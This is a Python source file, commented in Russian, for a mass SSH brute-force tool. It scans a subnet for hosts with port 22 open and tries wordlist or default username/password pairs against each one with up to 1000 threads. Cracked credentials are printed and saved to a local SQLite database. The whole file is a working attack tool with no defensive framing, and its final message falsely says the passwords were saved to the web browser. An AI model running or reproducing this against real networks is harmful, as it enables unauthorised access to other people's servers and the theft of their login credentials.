import argparse
import ipaddress
import sqlite3
import paramiko
from paramiko.ssh_exception import SSHException
from paramiko import SSHClient, AutoAddPolicy
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from tabulate import tabulate
from colorama import Fore, Style, init
import socket
import sys
import time

# ====================================================================
# Инициализация Colorama
# ====================================================================
init(autoreset=True)
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

class SSHBruteForce:
    """
    Класс для выполнения сканирования и перебора SSH паролей.
    """

    def __init__(self, subnet, credentials_file=None, users_file=None, passwords_file=None):
        """
        Инициализирует параметры подсети и учетных данных.
        """
        self.subnet = subnet
        self.credentials_file = credentials_file
        self.users_file = users_file
        self.passwords_file = passwords_file
        self.success_results = []
        self.db_path = 'suzu.db'
        self.open_hosts = []
        self.credentials = []

    # ====================================================================
    # Создание базы данных
    # ====================================================================
    def create_database(self):
        """
        Создает таблицу для хранения результатов перебора SSH.
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ssh (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                username TEXT,
                password TEXT,
                date_added TEXT
            )
        ''')
        conn.commit()
        conn.close()

    # ====================================================================
    # Загрузка учетных данных
    # ====================================================================
    def load_credentials(self):
        """
        Загружает учетные данные для перебора.
        """
        if self.credentials_file:
            with open(self.credentials_file, 'r') as file:
                for line in file:
                    username, password = line.strip().split(':', 1)
                    self.credentials.append({'username': username, 'password': password})
        elif self.users_file and self.passwords_file:
            with open(self.users_file, 'r') as uf, open(self.passwords_file, 'r') as pf:
                users = [line.strip() for line in uf]
                passwords = [line.strip() for line in pf]
                for user in users:
                    for pwd in passwords:
                        self.credentials.append({'username': user, 'password': pwd})
        else:
            default_file = './ssh/default_ssh_credentials.txt'
            with open(default_file, 'r') as file:
                for line in file:
                    try:
                        username, password = line.strip().split(':', 1)
                        self.credentials.append({'username': username, 'password': password})
                    except ValueError:
                        pass

    # ====================================================================
    # Сканирование сети
    # ====================================================================
    def scan_network(self):
        """
        Сканирует подсеть на наличие хостов с открытым портом 22.
        """
        ips = [str(ip) for ip in ipaddress.IPv4Network(self.subnet).hosts()]
        with ThreadPoolExecutor(max_workers=255) as executor:
            results = executor.map(self.check_ssh_port, ips)
        print(f"{Fore.LIGHTYELLOW_EX}[Завершено]{Style.RESET_ALL} Сканирование открытых портов завершено.")
        self.open_hosts = [ip for ip in results if ip]

    def check_ssh_port(self, ip):
        """
        Проверяет, открыт ли порт 22 на указанном IP.
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)
            try:
                sock.connect((ip, 22))
                print(Fore.GREEN + f"[+] Открыт порт 22: {ip}" + Style.RESET_ALL)
                return ip
            except:
                return None

    # ====================================================================
    # Перебор SSH учетных данных
    # ====================================================================
    def brute_force(self, ip, cred):
        """
        Функция для перебора пары логин/пароль для указанного IP.
        
        Параметры:
            ip (str): IP-адрес цели.
            cred (dict): Словарь с ключами 'username' и 'password'.
        """
        max_retries = 50  # Максимальное количество попыток
        retries = 0

        while retries < max_retries:
            try:
                client = SSHClient()
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(ip, port=22, username=cred['username'], password=cred['password'], timeout=10)
                print(f"{Fore.GREEN}[Успех]{Style.RESET_ALL} {ip} - {cred['username']}:{cred['password']}")
                self.success_results.append({"ip": ip, "username": cred['username'], "password": cred['password']})
                client.close()
                return
            except SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    retries += 1
                    time.sleep(5)  # Подождем немного перед повторной попыткой
                    continue
                else:
                    return
            except Exception as e:
                return

    def run_bruteforce(self):
        """
        Запускает перебор учетных данных для каждого открытого хоста.
        """
        for ip in self.open_hosts:
            with ThreadPoolExecutor(max_workers=1000) as executor:
                futures = {
                    executor.submit(self.brute_force, ip, cred): cred
                    for cred in self.credentials
                }
                for future in as_completed(futures):
                    cred = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{Fore.RED}[Ошибка]{Style.RESET_ALL} {ip} - {cred['username']}:{cred['password']}: {e}")

    # ====================================================================
    # Сохранение данных в базу
    # ====================================================================
    def save_to_db(self, ip, username, password):
        """
        Сохраняет успешные результаты в базу данных.
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO ssh (ip, username, password, date_added) VALUES (?, ?, ?, ?)",
            (ip, username, password, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        conn.close()

    # ====================================================================
    # Вывод результатов
    # ====================================================================
    def display_results(self):
        """
        Выводит успешные результаты в таблице.
        """
        table = [[res['ip'], res['username'], res['password']] for res in self.success_results]
        print(Fore.GREEN + tabulate(table, headers=["IP", "Пользователь", "Пароль"], tablefmt="fancy_grid") + Style.RESET_ALL)
        for res in self.success_results:
            self.save_to_db(res['ip'], res['username'], res['password'])
        print(f"{Fore.LIGHTYELLOW_EX}[Результат]{Style.RESET_ALL} Все пароли сохранены в веб-браузер")

    # ====================================================================
    # Запуск
    # ====================================================================
    def run(self):
        """
        Основной метод для запуска.
        """
        start_time = time.time()  # Начало замера времени

        self.create_database()
        self.load_credentials()
        self.scan_network()

        if self.open_hosts:
            total_ips = len(self.open_hosts)
            total_passwords = len(self.credentials)

            print(f"{Fore.YELLOW}[+] Найдено {total_ips} хостов с открытым портом 22.{Style.RESET_ALL}")
            
            self.run_bruteforce()
            self.display_results()

            # Подсчет времени выполнения
            end_time = time.time()
            elapsed_time = end_time - start_time
            hours, rem = divmod(elapsed_time, 3600)
            minutes, seconds = divmod(rem, 60)

            # Итоговая статистика
            print("\n")
            print(f"{Fore.CYAN}Кол-во IP-адресов: {total_ips}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Кол-во паролей: {total_passwords}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Время итогового выполнения: {int(hours)}ч {int(minutes)}м {int(seconds)}с{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Не найдено хостов с открытым портом 22.{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="Перебор SSH учетных данных.")
    parser.add_argument('-s', '--subnet', required=True, help="Подсеть для сканирования.")
    parser.add_argument('-f', '--credentials_file', help="Файл с парами username:password.")
    parser.add_argument('-u', '--users_file', help="Файл с логинами.")
    parser.add_argument('-p', '--passwords_file', help="Файл с паролями.")
    args = parser.parse_args()

    brute_forcer = SSHBruteForce(args.subnet, args.credentials_file, args.users_file, args.passwords_file)
    brute_forcer.run()


if __name__ == "__main__":
    main()
